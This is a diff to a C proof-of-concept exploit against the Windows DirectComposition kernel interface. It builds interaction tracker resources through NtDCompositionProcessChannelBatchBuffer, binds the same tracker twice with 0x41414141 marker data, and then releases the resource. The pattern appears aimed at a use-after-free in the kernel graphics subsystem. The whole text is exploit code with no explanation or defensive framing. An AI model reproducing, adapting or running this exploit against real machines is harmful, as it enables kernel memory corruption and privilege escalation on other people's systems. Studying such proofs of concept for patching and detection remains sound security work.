@@ -121,20 +121,8 @@ int main(int argc, TCHAR* argv[])
         exit(-1);
     }
     printf("[+] Create Tracker1\n");
-    *(DWORD*)pMappedAddress = nCmdCreateResource;
-    *(HANDLE*)((PCHAR)pMappedAddress + 4) = (HANDLE)Tracker2;
-    *(DWORD*)((PCHAR)pMappedAddress + 8) = CInteractionTrackerMarshaler;
-    *(DWORD*)((PCHAR)pMappedAddress + 0xc) = FALSE;
-    NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);
-    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);
-    if (!NT_SUCCESS(ntStatus)) {
-        printf("[-] Fail to create Tracker2\n");
-        exit(-1);
-    }
-    printf("[+] Create Tracker2\n");
-
     szBuff[0] = Tracker1;
-    szBuff[1] = Tracker2;
+    szBuff[1] = Tracker1;
     szBuff[2] = 0x41414141;
     UINT datasz = 0xc;
     *(DWORD*)pMappedAddress = nCmdSetBufferProperty;
@@ -144,26 +132,26 @@ int main(int argc, TCHAR* argv[])
     CopyMemory((PUCHAR)pMappedAddress + 0x10, szBuff, datasz);
     ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10 + datasz, &dwArg1, &dwArg2);
     if (!NT_SUCCESS(ntStatus)) {
-        printf("[-] Fail to binding Tracker1 and Tracker2 to TrackerBingin1\n");
+        printf("[-] Fail to binding Tracker1 to TrackerBingin1\n");
         exit(-1);
     }
-    printf("[+] Binding Tracker1 and Tracker2 to TrackerBinding1\n");
+    printf("[+] Binding Tracker1 to TrackerBinding1\n");
 
     szBuff[0] = Tracker1;
-    szBuff[1] = Tracker2;
-    szBuff[2] = 0x424242242;
+    szBuff[1] = Tracker1;
+    szBuff[2] = 0x41414141;
     *(DWORD*)pMappedAddress = nCmdSetBufferProperty;
-    *(HANDLE*)((PCHAR)pMappedAddress + 4) = (HANDLE)Binding1;
+    *(HANDLE*)((PCHAR)pMappedAddress + 4) = (HANDLE)Binding2;
     *(DWORD*)((PCHAR)pMappedAddress + 8) = 0;
     *(DWORD*)((PCHAR)pMappedAddress + 0xc) = datasz;
     CopyMemory((PUCHAR)pMappedAddress + 0x10, szBuff, datasz);
     ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10 + datasz, &dwArg1, &dwArg2);
 
     if (!NT_SUCCESS(ntStatus)) {
-        printf("[-] Fail to binding Tracker1 and Tracker2 to TrackerBingin2\n");
+        printf("[-] Fail to binding Tracker1 to TrackerBingin2\n");
         exit(-1);
     }
-    printf("[+] Binding Tracker1 and Tracker2 to TrackerBinding2\n");
+    printf("[+] Binding Tracker1 to TrackerBinding2\n");
 
     *(DWORD*)pMappedAddress = nCmdReleaseResource;
     *(DWORD*)((PCHAR)pMappedAddress + 4) = Tracker1;
